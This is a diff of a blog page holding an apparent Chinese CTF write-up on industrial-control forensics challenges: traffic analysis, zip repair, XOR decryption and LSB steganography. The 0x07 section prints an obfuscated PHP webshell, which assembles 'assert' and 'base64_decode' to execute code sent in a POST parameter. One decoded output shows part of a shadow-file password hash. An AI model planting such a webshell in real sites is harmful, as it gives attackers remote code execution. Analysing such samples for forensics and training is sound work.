@@ -35,8 +35,26 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061548308.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061632237.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061630863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061900952.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061901071.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061903500.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061904448.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301420387.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301421639.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301710203.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301711195.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301711063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301719506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301726001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301723493.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301723330.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301728209.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301730058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301744923.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301914497.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202311011428223.png">
 <meta property="article:published_time" content="2023-10-05T13:43:22.090Z">
-<meta property="article:modified_time" content="2023-10-06T08:42:32.196Z">
+<meta property="article:modified_time" content="2023-11-01T10:48:55.518Z">
 <meta property="article:author" content="leekos">
 <meta property="article:tag" content="xss漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -247,7 +265,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          6.2k 字
         
       </span>
     
@@ -258,7 +276,7 @@
         
         
         
-          18 分钟
+          53 分钟
         
       </span>
     
@@ -308,7 +326,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年10月6日 下午
+                    本文最后更新于：2023年11月1日 晚上
                   
                 
               </p>
@@ -372,7 +390,81 @@
 <p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061630863.png" srcset="/img/loading.gif" lazyload alt="image-20231006163014994"></p>
 <p>为什么flag是<code>155989</code>，因为前面两个ip主机号都是<code>1、254</code>，</p>
 <p>一般首位地址和末尾地址用于特殊设备使用，因此推测第四次扫描编号为155989</p>
+<h3 id="0x07-隐藏的黑客"><a href="#0x07-隐藏的黑客" class="headerlink" title="0x07.隐藏的黑客"></a>0x07.隐藏的黑客</h3><blockquote>
+<p>根据情报得知工控现场发现某SCADA系统被黑客攻破,附件为黑客在目录留下的文件和当时时间段捕获到的一部分流量包,你能根据这些信息分析出蛛丝马迹来么flag形式为 flag{}。</p>
+</blockquote>
+<p>找到zip文件</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061900952.png" srcset="/img/loading.gif" lazyload alt="image-20231006190014704"></p>
+<p>切换成原始数据然后分离出zip</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061901071.png" srcset="/img/loading.gif" lazyload alt="image-20231006190107104"></p>
+<p>打开发现需要密码，然后我们需要使用py脚本提取出<code>upload</code>文件夹中的密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br>path = <span class="hljs-string">r&quot;C:\Users\LIKE\Desktop\attachment_1579250492_upload\upload&quot;</span><br>fpass = <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;C:\Users\LIKE\Desktop\attachment_1579250492_upload\pass.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(path):<br>    file = os.path.join(path, filename)<br>    f = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;r&quot;</span>)<br>    content = f.read()<br>    f.close()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&quot;POST\[(.*)\]&quot;</span>, content)<br>        fpass.write(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;\n&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>fpass.close()<br></code></pre></td></tr></table></figure>
 
+<p>字典爆破出密码：<code>7b8b965ad4bca</code></p>
+<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061903500.png" srcset="/img/loading.gif" lazyload alt="image-20231006190305426" style="zoom: 50%;" />
+
+<p>webshell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>@<span class="hljs-variable">$c</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;1JFUVVFU1RbJzlhNzJjM&quot;</span>,<span class="hljs-string">&quot;2Q1ZTc0ZjYwNTFiYjNiMzU&quot;</span>,<span class="hljs-string">&quot;5MGZhOTMxOWZlJ10pOw&quot;</span>,<span class="hljs-string">&quot;MGZhOTMxOWZlJ&quot;</span>,<span class="hljs-string">&quot;MGZhOTMxOWZlJ&quot;</span>);<br>@<span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;ZXZhbCgkX&quot;</span>;<br>@<span class="hljs-variable">$o0o00o00o00o0o0</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">115</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">115</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">114</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">116</span>);<br>@<span class="hljs-variable">$ooo00o0o0o0o0o0</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">98</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">115</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">54</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">52</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">95</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">101</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">111</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">100</span>).<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">101</span>);<br>@<span class="hljs-variable">$count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$x</span>++)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$x</span>, @<span class="hljs-variable">$c</span>))&#123;<br>                @<span class="hljs-variable">$str</span>=@<span class="hljs-variable">$str</span>.@<span class="hljs-variable">$c</span>[@<span class="hljs-variable">$count</span>];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> == <span class="hljs-number">2</span>)<br>                &#123;       <br>                        @<span class="hljs-variable">$o0o00o00o00o0o0</span>(@<span class="hljs-variable">$ooo00o0o0o0o0o0</span>(@<span class="hljs-variable">$str</span>));<br>                &#125;<br>                @<span class="hljs-variable">$count</span>++;<br>        &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们使用<code>echo</code>输出：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310061904448.png" srcset="/img/loading.gif" lazyload alt="image-20231006190426357"></p>
+<p>base64解码得到flag</p>
+<h3 id="0x08-简单流量分析"><a href="#0x08-简单流量分析" class="headerlink" title="0x08.简单流量分析"></a>0x08.简单流量分析</h3><blockquote>
+<p>不久前，运维人员在日常安全检查的时候发现现场某设备会不时向某不知名ip发出非正常的ICMP PING包。这引起了运维人员的注意，他在过滤出ICMP包分析并马上开始做应急处理很可能已被攻击的设备。运维人员到底发现了什么?flag形式为 flag{}</p>
+</blockquote>
+<p>过滤所以ICMP请求包</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301420387.png" srcset="/img/loading.gif" lazyload alt="image-20231030142033261"></p>
+<p>注意一下每个data base64后的长度，发现符合ascii码</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301421639.png" srcset="/img/loading.gif" lazyload alt="image-20231030142131139"></p>
+<p>于是写脚本，先16进制转字符串后，计算长度，转为ascii码，再base64解码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br>base64_char=<span class="hljs-string">&quot;&quot;</span><br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = f.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data:<br>    line = line.strip()<br>    length = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(binascii.unhexlify(line)))<br>    base64_char += <span class="hljs-built_in">chr</span>(length)<br><br>base64_char = base64.b64decode(base64_char)<br><span class="hljs-built_in">print</span>(base64_char)<br><br><br><span class="hljs-string">b&#x27;::\\nmongodb:!:17843:0:99999:7:::\\nubuntu:$6$LhHRomTE$M7C4n84UcFLAG&#123;xx2b8a_6mm64c_fsociety&#125;::&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x09-奇怪的文件"><a href="#0x09-奇怪的文件" class="headerlink" title="0x09.奇怪的文件"></a>0x09.奇怪的文件</h3><p>总共有三个部分：part1、2、3</p>
+<p>part1</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301710203.png" srcset="/img/loading.gif" lazyload alt="image-20231030171034022"></p>
+<p>part2</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301711195.png" srcset="/img/loading.gif" lazyload alt="image-20231030171127928"></p>
+<p>part3</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301711063.png" srcset="/img/loading.gif" lazyload alt="image-20231030171136904"></p>
+<p>简单看一下，发现3个文件都少了<code>50 4B</code></p>
+<p>然后我们使用<code>010editor</code>发现压缩包中没有文件，所以不能简单的拼起来</p>
+<p>zip文件结构分析：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/700">https://goodapple.top/archives/700</a></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301719506.png" srcset="/img/loading.gif" lazyload alt="image-20231030171952526"></p>
+<p>我们发现part1少了crc校验码</p>
+<p>根据文章：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301726001.png" srcset="/img/loading.gif" lazyload alt="image-20231030172619177"></p>
+<p>part2中可以找到crc <code>34 47 56 50</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301723493.png" srcset="/img/loading.gif" lazyload alt="image-20231030172212217"></p>
+<p>我们给part1加上<code>50 4B</code> 并修改crc</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301723330.png" srcset="/img/loading.gif" lazyload alt="image-20231030172341064"></p>
+<p>同时我们发现part2中没有<code>文件名称</code></p>
+<p>于是我们找到part1中的文件名称：<code>4B 65 79 56 69 73 75 61 6C 2E 6A 70 67 8D</code></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301728209.png" srcset="/img/loading.gif" lazyload alt="image-20231030172846192"></p>
+<p>插入到part2中</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301730058.png" srcset="/img/loading.gif" lazyload alt="image-20231030173047251"></p>
+<p>这样三个拼在一起就行了</p>
+<p>然后zip加密，我们需要爆破密码：<code>GyxXaq9</code> …</p>
+<p>然后图片末尾藏了一个逆序的压缩包，我们需要再逆回来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/a.zip&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/b.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>data = f.read()<br>data = <span class="hljs-built_in">bytearray</span>(data)<br><br>data.reverse()<br>f2.write(data)<br></code></pre></td></tr></table></figure>
+
+<p>得到<code>enc.pyc</code>和<code>encrypted</code></p>
+<p>使用：<a target="_blank" rel="noopener" href="https://tool.lu/pyc/">https://tool.lu/pyc/</a> py反编译</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.6</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyGenerate</span>():<br>    random.seed(<span class="hljs-number">10</span>)<br>    keyseed = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>        x = random.randint(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>        keyseed += <span class="hljs-built_in">chr</span>(x)<br>    <br>    <span class="hljs-keyword">return</span> base64.b64encode(keyseed.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">key, file</span>):<br>    count = <span class="hljs-number">0</span><br>    f = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encrypted&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    <span class="hljs-keyword">for</span> now <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">for</span> nowByte <span class="hljs-keyword">in</span> now:<br>            newByte = nowByte ^ <span class="hljs-built_in">ord</span>(key[count % <span class="hljs-built_in">len</span>(key)])<br>            count += <span class="hljs-number">1</span><br>            f1.write(<span class="hljs-built_in">bytes</span>([<br>                newByte]))<br>        <br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = KeyGenerate()<br>    enc(key, sys.argv[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
+
+<p>这里seed设置值为10，所以是伪随机，并且加密函数是异或，只要再异或一下就回去了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.6</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyGenerate</span>():<br>    random.seed(<span class="hljs-number">10</span>)<br>    keyseed = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>        x = random.randint(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>        keyseed += <span class="hljs-built_in">chr</span>(x)<br>    <br>    <span class="hljs-keyword">return</span> base64.b64encode(keyseed.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec</span>(<span class="hljs-params">key</span>):<br>    count = <span class="hljs-number">0</span><br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encrypted&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decrypted&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    <span class="hljs-keyword">for</span> now <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">for</span> nowByte <span class="hljs-keyword">in</span> now:<br>            originalByte = nowByte ^ <span class="hljs-built_in">ord</span>(key[count % <span class="hljs-built_in">len</span>(key)])<br>            count += <span class="hljs-number">1</span><br>            f1.write(<span class="hljs-built_in">bytes</span>([originalByte]))<br><br>      <br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = KeyGenerate()<br>    dec(key)<br></code></pre></td></tr></table></figure>
+
+<p>解密后得到一张jpg照片，该图片有LSB隐写，但隐写信息加密</p>
+<p>需要lsb密码爆破：<code>U!lSb29</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"> ~/Desktop/misctools/clocked_pixel_lsb <br>&gt; python2 lsb.py extract decrypted.png <span class="hljs-number">1.</span>png <span class="hljs-string">&#x27;U!lSb29&#x27;</span><br>[+] Image size: 254x156 pixels.<br>[+] Written extracted data to <span class="hljs-number">1.</span>png.<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301744923.jpg" srcset="/img/loading.gif" lazyload alt="1"></p>
+<h3 id="0x10-S7COMM协议分析"><a href="#0x10-S7COMM协议分析" class="headerlink" title="0x10.S7COMM协议分析"></a>0x10.S7COMM协议分析</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202310301914497.png" srcset="/img/loading.gif" lazyload alt="image-20231030191427213"></p>
+<p>s7comm按照长度排序，16进制转字符串</p>
+<h3 id="0x11-组态软件分析"><a href="#0x11-组态软件分析" class="headerlink" title="0x11.组态软件分析"></a>0x11.组态软件分析</h3><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202311011428223.png" srcset="/img/loading.gif" lazyload alt="image-20231101142841541"></p>
+<h3 id="0x12-恶意软件后门分析"><a href="#0x12-恶意软件后门分析" class="headerlink" title="0x12.恶意软件后门分析"></a>0x12.恶意软件后门分析</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3>
                 
               </div>
             
@@ -436,7 +528,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年10月6日</div>
+          <div>2023年11月1日</div>
         </div>
       
       
@@ -466,6 +558,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/10/08/2022%E6%B1%9F%E8%A5%BF%E6%8C%AF%E5%85%B4%E6%9D%AF/" title="2022江西振兴杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022江西振兴杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
